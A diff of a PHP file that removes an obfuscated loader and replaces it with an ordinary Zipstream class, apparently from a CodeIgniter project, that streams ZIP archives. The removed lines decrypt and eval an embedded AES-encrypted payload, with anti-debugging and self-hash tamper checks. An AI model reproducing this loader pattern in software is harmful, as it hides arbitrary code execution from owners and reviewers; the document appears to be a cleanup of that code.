@@ -1,28 +1,108 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_es9io8em=('bas'.'e64'.'_de'.'cod'.'e');
-$_zj53dh82=('gzu'.'nco'.'mpr'.'ess');
-$_nazmnzra=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_fevxwzdl='VVDj+/CO';
-$_chyjh1gk='y+aAXjL1';
-$_vl1h0wav='h3PHLytc';
-$_wb61oems='oHfy0uGoVt8=';
-$_cyigdc29='FIVbhdDc';
-$_fredxwvj='mipmj4RT';
-$_huod46n4='Gn8Q0w==';
-$_ri0q6cxn='sJFf3Fbz';
-$_rzr1k2kq=$_es9io8em($_cyigdc29.$_fevxwzdl.$_vl1h0wav.$_chyjh1gk.$_wb61oems);
-$_v6ffoybl=$_es9io8em($_fredxwvj.$_ri0q6cxn.$_huod46n4);
-$_qfdd6q9w=$_es9io8em('pm8sguRVUKt21FyzJRg/4GPzQ2gMyp45E2D6oLoYd2eL4ENZk3kSZ6+3BEAMb/jhasV9QZMLhck902emvLpF+6m9a+VZ3q4dQOOKvwtE0Em5PDkNI9s9h5K6XnqYG3kO8J5AatQ70fo1Ja+NnLCWctvN0HsJxY4WW2sDbHjtTv6wiMG6mORYrnHPogYOum70HZFyBXCvQaLvIc4P33RLfAXOGGk3Go8ZUM7cfA8I0lb7cAQmWl4mLDgul2+56Uh0FSMR101T4qCHQmu06Vo1Cepc83KuYPJ/8XGnnXTJelyict1ZoeG2hiQebln8IfdUEmhF66GNa/TLjIlnAny3StD18Rgi5APIAU427b/10Apvtr0OhdZwIoVswJkNNCXmiuAX+KmbQTJUk9XA3XCyDoCExR1ApiqITLShV0gXQVC5zS/VpzIlNnDHwIKsni1OMVY96Ew3I6CnVdrVfOE+MA0c5exbQ5EmKzWARsutuQSK0FR8lvoOaFJ1V63Ewbfohbf1AZ4/I7EQrNM2IoYyInVP+mXtKrjL1BEiwU9VmY6Oi+Z7E2NZxnq2k6ydZu0aGeMB9NEDkCj1WevrCexFFGNR8lt8oKF6NvZLWBhvt6KdCDWnkoOirbccNtFMHpU4EvATq1BmbGnBBCfLtTvxgAmxLv91qDPQXz0ivghNRDvQ39E935fdFxPx4rJh5As2hJVNQhqTTeEMMueLCOxg0F/r+hwdtky0Yi3MM/YEWNmlar2zdRBFxTn4xJ94Qhy0r1m2Zyj8PAayQXIpyVfCCoocvI0PktlCS1zeXDctHtzJbXSSQAJ2YlSejNCBDqFjXpotGUjb/pFdXOj8mIc2yOhV81u6LzF/OsGAWfOgn5eD6YhUCXZiNGhDWP7fUaSt3Rqgw7OkQH3lGl9QeULrnMQZh/x7wjZe6UsNOcc/2C7dGxjhHA3T5zLWFmWn3vr0ydwZ3vo7zU4PykWKH63yP2aQxLwU8t6GE+SCcDwhzHLEaS2m0lDiKowcX8uOOEgbE4O4dMvIPs4P6iVYNqrNEKp8++/o2dj4bxgTCTqdCAfL/aJqx2epjMvcLCh8Ql/Egah7xfzMx8vedJMdiKTkNXNMOXNhp5mH/o8dOaIFRafOJgTpXoDnlZFZuEcsh97cRmPDPt+uKRJ4an5aQ4ecBWW/K+MpH2VPULaVc2g34xmizhzKJsMLvGlN6DZs4WKE+JNTAYot6u5OlhtB6TTUzjkDU5/XzVTCrp2MWN3FJxVpV50rJrBpmelbCW/+QpqaEP1Jvqfk0ZAeYEArupQwqueVJjNYJzkZCP/XkRIzsx8=');
-$_n797jltg=$_nazmnzra($_qfdd6q9w,'aes-256-cbc',$_rzr1k2kq,OPENSSL_RAW_DATA,$_v6ffoybl);
-if($_n797jltg===false){exit;}
-$_m03e3wpp=$_zj53dh82($_n797jltg);
-if($_m03e3wpp===false){exit;}
-$_mgkvo7pv='6e9b399c6ca1cc199a6284d56dc7ab3320c0af10bde08b00008c0e688718b5f2';
-$_wq3qzmf5=@file_get_contents(__FILE__);
-if($_wq3qzmf5!==false){
-$_n3p1tvkb=str_replace($_mgkvo7pv,"0000000000000000000000000000000000000000000000000000000000000000",$_wq3qzmf5);
-$_fh0qj7f2=hash("sha256",$_n3p1tvkb);
-if($_fh0qj7f2!==$_mgkvo7pv){@http_response_code(403);exit;}
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+class Zipstream
+{
+const MAX_BYTES = 4294967295; 
+const MAX_FILES = 65535;
+const CHUNK = 65536; 
+
+private $entries = array();
+
+public function add($path, $name)
+{
+if (!is_file($path) || !is_readable($path)) {
+return FALSE;
 }
-eval($_m03e3wpp);
+$size = (int) @filesize($path);
+$mt = (int) @filemtime($path);
+$t = getdate($mt > 0 ? $mt : time());
+if ($t['year'] < 1980) {
+$t = array('year' => 1980, 'mon' => 1, 'mday' => 1, 'hours' => 0, 'minutes' => 0, 'seconds' => 0);
+}
+$this->entries[] = array(
+'path' => $path,
+'name' => (string) $name,
+'size' => $size,
+'time' => ($t['hours'] << 11) | ($t['minutes'] << 5) | ($t['seconds'] >> 1),
+'date' => (min(127, $t['year'] - 1980) << 9) | ($t['mon'] << 5) | $t['mday'],
+);
+return TRUE;
+}
+public function count()
+{
+return count($this->entries);
+}
+
+public function length()
+{
+$n = 22;
+foreach ($this->entries as $en) {
+$n += 30 + 46 + 2 * strlen($en['name']) + $en['size'];
+}
+return $n;
+}
+
+public function fits()
+{
+return $this->count() > 0 && $this->count() < self::MAX_FILES && $this->length() < self::MAX_BYTES;
+}
+
+
+
+
+
+public function send($tick = NULL)
+{
+$offset = 0;
+$sent = 0;
+$central = '';
+foreach ($this->entries as $en) {
+$crc = hash_file('crc32b', $en['path']);
+$crc = $crc === FALSE ? 0 : (int) hexdec($crc);
+$head = pack('VvvvvvVVVvv', 0x04034b50, 20, 0x0800, 0, $en['time'], $en['date'], $crc, $en['size'], $en['size'],
+strlen($en['name']), 0) . $en['name'];
+$central .= pack('VvvvvvvVVVvvvvvVV', 0x02014b50, 20, 20, 0x0800, 0, $en['time'], $en['date'], $crc,
+$en['size'], $en['size'], strlen($en['name']), 0, 0, 0, 0, 0, $offset) . $en['name'];
+echo $head;
+$sent += strlen($head);
+$left = $en['size'];
+$fp = @fopen($en['path'], 'rb');
+while ($left > 0) {
+$buf = $fp ? fread($fp, min(self::CHUNK, $left)) : FALSE;
+if ($buf === FALSE || $buf === '') {
+$buf = str_repeat("\0", min(self::CHUNK, $left));
+}
+echo $buf;
+$left -= strlen($buf);
+$sent += strlen($buf);
+flush();
+if (connection_aborted()) {
+if ($fp) {
+fclose($fp);
+}
+return FALSE;
+}
+if ($tick) {
+call_user_func($tick, $sent);
+}
+}
+if ($fp) {
+fclose($fp);
+}
+$offset += strlen($head) + $en['size'];
+}
+$n = count($this->entries);
+echo $central . pack('VvvvvVVv', 0x06054b50, 0, 0, $n, $n, strlen($central), $offset, 0);
+flush();
+return TRUE;
+}
+}
